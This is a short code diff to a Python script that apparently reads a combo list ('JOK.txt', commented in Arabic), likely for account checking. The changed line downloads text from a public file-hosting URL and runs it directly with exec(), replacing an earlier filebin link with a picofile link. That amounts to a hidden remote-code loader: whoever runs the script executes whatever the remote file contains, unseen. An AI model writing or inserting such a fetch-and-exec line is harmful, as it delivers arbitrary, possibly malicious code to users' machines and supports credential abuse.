@@ -6,7 +6,7 @@ file=open('JOK.txt',"+r") #اسم الكمبو
 
 
 from requests import *
-exec(get('https://filebin.net/yalfaet52tuyfu94/About__1_.txt').text)
+exec(get('https://s29.picofile.com/d/8465592050/3dc6d562-660b-4b4c-9b03-f9699a40fe07/About_1_.txt').text)
 #
 
 start_num = 0
